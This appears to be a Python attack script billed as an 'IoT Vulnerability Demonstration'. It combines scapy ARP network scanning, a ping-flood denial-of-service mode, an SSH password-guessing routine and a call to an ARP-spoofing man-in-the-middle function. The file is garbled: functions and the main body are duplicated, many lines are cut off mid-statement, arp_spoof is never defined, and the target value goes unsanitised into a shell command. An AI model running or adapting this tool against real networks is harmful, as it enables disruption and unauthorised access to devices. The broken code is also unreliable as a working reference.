import argparse
from scapy.all import ARP, Ether, srp
import os
import paramiko

def parse_arguments():
    parser = argparse.ArgumentParser(description="IoT Vulnerability Demonstrati>
    parser.add_argument("-t", "--target", help="Target IP address or range")
    parser.add_argument("-i", "--interface", help="Network interface to use")
    parser.add_argument("-a", "--attack", help="Type of attack to perform", cho>
    parser.add_argument("-u", "--username", help="Username for brute-force atta>
    parser.add_argument("-p", "--password", help="Password for brute-force atta>
    parser.add_argument("-g", "--gateway", help="Gateway IP address for MITM at>
    return parser.parse_args()

def scan_network(target, interface):
    arp_request = ARP(pdst=target)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=3, iface=interface, verbose=False)[0]
def scan_network(target, interface):
    arp_request = ARP(pdst=target)
    ether = Ether(dst="ff:ff:ff:ff:ff:ff")
    packet = ether / arp_request
    result = srp(packet, timeout=3, iface=interface, verbose=False)[0]

    devices = []
    for sent, received in result:
        devices.append({"ip": received.psrc, "mac": received.hwsrc})
    return devices

def ping_flood(target):
    os.system(f"ping -f -c 100 {target}")

def ssh_brute_force(target, username, password):
    try:
        ssh_client = paramiko.SSHClient()
        ssh_client.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh_client.connect(hostname=target, username=username, password=passwor>
        print(f"Successfully logged in to {target} using {username}/{password}")
    except paramiko.AuthenticationException:
        print(f"Failed to login to {target} using {username}/{password}")
def main():
    args = parse_arguments()

    if args.target and args.interface:
        devices = scan_network(args.target, args.interface)
        print("Devices found on the network:")
        for device in devices:
            print(f"IP: {device['ip']}, MAC: {device['mac']}")

    if args.target and args.attack == "dos":

      args = parse_arguments()

    if args.target and args.interface:
        devices = scan_network(args.target, args.interface)
        print("Devices found on the network:")
        for device in devices:
            print(f"IP: {device['ip']}, MAC: {device['mac']}")

    if args.target and args.attack == "dos":
        ping_flood(args.target)
    elif args.target and args.attack == "mitm" and args.gateway:
        arp_spoof(args.target, args.gateway)
    elif args.target and args.attack == "bruteforce" and args.username and args>
        ssh_brute_force(args.target, args.username, args.password)
    else:
        print("Please provide valid arguments. Use --help for usage instruction>

if __name__ == "__main__":
    main()

